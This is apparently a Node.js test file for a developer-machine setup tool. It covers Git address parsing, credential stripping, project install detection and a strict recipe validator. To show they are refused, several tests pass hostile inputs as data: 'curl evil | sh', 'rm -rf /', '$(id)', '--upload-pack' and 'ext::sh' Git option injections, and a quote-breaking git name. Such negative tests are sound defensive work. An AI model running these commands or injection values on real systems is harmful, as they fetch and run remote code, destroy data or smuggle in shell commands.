// Repository addresses, what a project needs, repository state, and the recipe validator (every refusal).
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { cleanRemote, expandDir, nodeSatisfies, parseRepo, parseStatus, prepareEnv, projectNeeds, rememberDir } from '../../src/pcsetup/projects.mjs';
import { homeRelative, makeRecipe, parseRecipeText, validateRecipe, loadRecipe } from '../../src/pcsetup/recipe.mjs';

test('parseRepo accepts plain https / SSH / owner/repo', () => {
  assert.deepEqual(parseRepo('octo/hello-world'), { url: 'https://github.com/octo/hello-world.git', name: 'hello-world' });
  assert.deepEqual(parseRepo('https://github.com/octo/hello-world'), { url: 'https://github.com/octo/hello-world', name: 'hello-world' });
  assert.deepEqual(parseRepo('https://gitlab.com/group/sub/repo.git'), { url: 'https://gitlab.com/group/sub/repo.git', name: 'repo' });
  assert.deepEqual(parseRepo('git@github.com:octo/hello.git'), { url: 'git@github.com:octo/hello.git', name: 'hello' });
  assert.ok(parseRepo('ssh://git@example.com:2222/team/repo.git'));
});

test('parseRepo refuses options, passwords, local paths and other transports', () => {
  for (const bad of [
    '', '-uhttps://x/y', '--upload-pack=touch /tmp/x', 'https://user:token@github.com/o/r.git', 'https://tok@github.com/o/r',
    'file:///etc/passwd', '/etc', './repo', '../repo', 'ext::sh -c touch% /tmp/pwned', 'ext::foo', 'http://github.com/o/r',
    'https://github.com/o/../r', 'https://github.com/o', 'git@github.com:/abs/path', 'git@github.com:-o/r', 'octo/re po', 'a\nb/c',
    'https://github.com/o/r?x=1', 'https://github.com/o/r#frag', `https://github.com/${'a'.repeat(400)}/r`,
  ]) assert.equal(parseRepo(bad), null, bad);
});

test('remotes lose any user name or password before they go into a recipe', () => {
  assert.equal(cleanRemote('https://x-access-token:ghs_abc@github.com/o/r.git'), 'https://github.com/o/r.git');
  assert.equal(cleanRemote('git@github.com:o/r.git'), 'git@github.com:o/r.git');
});

test('projects folder: "~/x" and absolute only; it becomes the first folder-picker root, the others stay', () => {
  assert.equal(expandDir('~/code', '/home/dev'), '/home/dev/code');
  assert.equal(expandDir('relative', '/home/dev'), null);
  assert.equal(expandDir('~/a/../b', '/home/dev'), null);
  let saved;
  rememberDir('/home/dev/projects', { load: () => ({ server: {} }), save: (p) => (saved = p), home: '/home/dev' });
  assert.deepEqual(saved, { projectsDir: '/home/dev/projects', server: { roots: ['/home/dev/projects', '/home/dev'] } });
  rememberDir('/w', { load: () => ({ server: { roots: ['/a', '/w'] } }), save: (p) => (saved = p) });
  assert.deepEqual(saved.server.roots, ['/w', '/a']);
});

test('what a project needs: the lockfile decides the install; .nvmrc / engines; .env.example is copied', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pcsetup-need-'));
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ engines: { node: '>=22' } }));
    fs.writeFileSync(path.join(dir, 'package-lock.json'), '{}');
    fs.writeFileSync(path.join(dir, 'requirements.txt'), 'requests\n');
    fs.writeFileSync(path.join(dir, '.env.example'), 'KEY=\n');
    const n = projectNeeds(dir, { has: (t) => t !== 'pnpm', nodeVersion: '20.11.0' });
    assert.deepEqual(n.installs.map((i) => [i.label, i.argv.join(' ')]), [['npm ci', 'npm ci'], ['a .venv with requirements.txt', 'sh -c python3 -m venv .venv && .venv/bin/python -m pip install -r requirements.txt']]);
    assert.deepEqual(n.node, { wants: '>=22', have: '20.11.0', ok: false });
    assert.equal(n.envExample, true);
    fs.writeFileSync(path.join(dir, 'pnpm-lock.yaml'), '');
    const p = projectNeeds(dir, { has: (t) => t !== 'pnpm' });
    assert.deepEqual([p.installs[0].label, p.installs[0].ready, p.installs[0].why], ['pnpm install', false, 'pnpm is not installed']);
    assert.equal(prepareEnv(dir), true);
    assert.equal(fs.readFileSync(path.join(dir, '.env'), 'utf8'), 'KEY=\n');
    fs.writeFileSync(path.join(dir, '.env'), 'KEY=mine\n');
    assert.equal(prepareEnv(dir), false); // an existing .env is never overwritten
    assert.equal(fs.readFileSync(path.join(dir, '.env'), 'utf8'), 'KEY=mine\n');
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
  assert.equal(nodeSatisfies('22.3.0', '22'), true);
  assert.equal(nodeSatisfies('22.3.0', 'v20.11.1'), false);
  assert.equal(nodeSatisfies('22.3.0', '^22.1'), true);
  assert.equal(nodeSatisfies('22.3.0', 'lts/*'), true);
});

test('repository state from git status --porcelain -b (counts only)', () => {
  assert.deepEqual(parseStatus('## main...origin/main [ahead 2, behind 1]\n M a.js\n?? b.txt\n'), { branch: 'main', upstream: 'origin/main', ahead: 2, behind: 1, changes: 2 });
  assert.deepEqual(parseStatus('## feature\n'), { branch: 'feature', upstream: null, ahead: 0, behind: 0, changes: 0 });
  assert.equal(parseStatus('## No commits yet on main\n').branch, 'main');
  assert.equal(parseStatus('## HEAD (no branch)\n').branch, '(detached)');
});

test('a recipe has no secrets: home-relative folder, cleaned addresses, the e-mail only when asked', () => {
  const home = os.homedir();
  const r = makeRecipe({ kits: ['basics', 'node'], tools: { git: '2.43.0' }, projectsDir: path.join(home, 'projects'), repos: ['https://github.com/o/r.git', 'https://github.com/o/r.git'], identity: { name: 'Dev', email: 'dev@example.com' } });
  assert.deepEqual(r, { hoprigRecipe: 1, kits: ['basics', 'node'], tools: { git: '2.43.0' }, projectsDir: '~/projects', repos: ['https://github.com/o/r.git'], git: { name: 'Dev' } });
  assert.equal(makeRecipe({ kits: [], identity: { name: 'Dev', email: 'dev@example.com' }, withEmail: true }).git.email, 'dev@example.com');
  assert.equal(homeRelative('/elsewhere', '/home/dev'), null);
  assert.equal(validateRecipe(r).ok, true);
});

test('the recipe validator refuses everything that is not plainly allowed', () => {
  const ok = { hoprigRecipe: 1, kits: ['basics'] };
  const refused = (over, re) => {
    const v = validateRecipe({ ...ok, ...over });
    assert.equal(v.ok, false, JSON.stringify(over));
    assert.ok(v.errors.some((e) => re.test(e)), `${JSON.stringify(over)} → ${v.errors.join(' | ')}`);
  };
  assert.equal(validateRecipe(null).ok, false);
  assert.equal(validateRecipe([]).ok, false);
  refused({ hoprigRecipe: 2 }, /must be 1/);
  refused({ kits: 'basics' }, /must be a list/);
  refused({ kits: ['basics', 'rm -rf /'] }, /unknown kit/);
  refused({ run: 'curl evil | sh' }, /unknown key "run"/);
  refused({ postInstall: ['x'] }, /unknown key/);
  refused({ tools: { git: '$(id)' } }, /not a name with a version/);
  refused({ tools: [] }, /must be an object/);
  refused({ projectsDir: '/etc' }, /home folder/);
  refused({ projectsDir: '~/../root' }, /home folder/);
  refused({ projectsDir: '~/a;rm -rf ~' }, /home folder/);
  refused({ repos: ['file:///etc'] }, /not a Git address/);
  refused({ repos: ['--upload-pack=touch /tmp/x'] }, /not a Git address/);
  refused({ repos: ['https://user:pass@github.com/o/r'] }, /not a Git address/);
  refused({ repos: 'o/r' }, /must be a list/);
  refused({ repos: Array(201).fill('o/r') }, /at most 200/);
  refused({ workspaces: ['ext::sh'] }, /not a Git address/);
  refused({ git: { name: 'x', token: 'y' } }, /only "name" and "email"/);
  refused({ git: { name: 'a"; touch /tmp/x; "' } }, /plain name/);
  refused({ git: { name: 'ok', email: 'not an email' } }, /e-mail/);
  refused({ projectTemplate: '/local/folder' }, /Git address/);
  assert.equal(parseRecipeText('{').ok, false);
  assert.equal(parseRecipeText('x'.repeat(70 * 1024)).ok, false);
});

test('a recipe from an address must be https; a file is read as data', async () => {
  assert.deepEqual((await loadRecipe('http://example.com/r.json')).errors, ['a recipe address must start with https://']);
  const r = await loadRecipe('https://example.invalid/r.json', { fetchImpl: async () => ({ ok: true, headers: new Map(), text: async () => '{"hoprigRecipe":1,"kits":["node"],"repos":["o/r"]}' }) });
  assert.deepEqual(r.recipe, { hoprigRecipe: 1, kits: ['node'], repos: ['https://github.com/o/r.git'] });
  assert.equal((await loadRecipe('/nonexistent/recipe.json')).ok, false);
});
